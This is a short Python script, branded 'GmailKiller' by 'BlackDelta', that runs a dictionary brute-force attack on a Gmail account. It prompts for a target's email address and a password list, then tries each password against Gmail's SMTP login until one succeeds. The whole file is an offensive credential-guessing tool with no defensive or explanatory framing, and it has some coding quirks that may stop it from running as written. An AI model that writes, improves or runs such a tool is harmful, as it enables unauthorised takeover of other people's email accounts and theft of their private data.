#!/usr/bin/python
import smtplib
smtpserv = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserv.ehlo()
smtpserv.starttls()

banner = '''
 / ___|_ __ ___   __ _(_) | |/ (_) | | ___ _ __
| |  _| '_ ` _ \ / _` | | | ' /| | | |/ _ \ '__|
| |_| | | | | | | (_| | | | . \| | | |  __/ |
 \____|_| |_| |_|\__,_|_|_|_|\_\_|_|_|\___|_|
==================BlackDelta====================
=================================================

                                                                      '''

print (banner)

user = raw_input("Enter the target's email address : ")
passwordfile =raw_input("Enter the path of the password list : ")
passwordfile = open(passwordfile,'read')
for password in passwordfile:
    try:
        smtpserv.login(user, password)
        print("[+] password Found :%s ") % password
        break;
    except smtplib.SMTPAuthenticationError:
        print("[-]password incorrect : %s") % password
